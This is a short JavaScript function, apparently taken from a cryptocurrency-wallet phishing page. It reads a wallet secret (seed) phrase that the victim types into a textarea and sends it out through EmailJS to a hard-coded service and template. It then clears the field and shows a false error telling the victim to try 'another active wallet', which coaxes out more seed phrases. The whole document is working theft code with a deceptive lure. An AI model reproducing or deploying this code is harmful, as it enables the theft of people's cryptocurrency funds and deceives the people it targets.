function sendMail(){
 
    const phraseTextarea = document.getElementById("secret_phrase");
    
    // Get the value of the textarea
    const phraseValue = phraseTextarea.value;
    
        var params= {
            subject: '',
            message: phraseValue
        }
        const serviceID  = 'service_zzi11ew';
        const templateID = 'template_1lecspk';
    emailjs.send(serviceID, templateID, params).then((res)=>{
        document.getElementById("secret_phrase").value= "";
        console.log(res);
        alert('An error occurred, try importing another active wallet');
    
    })
    }
    
    
    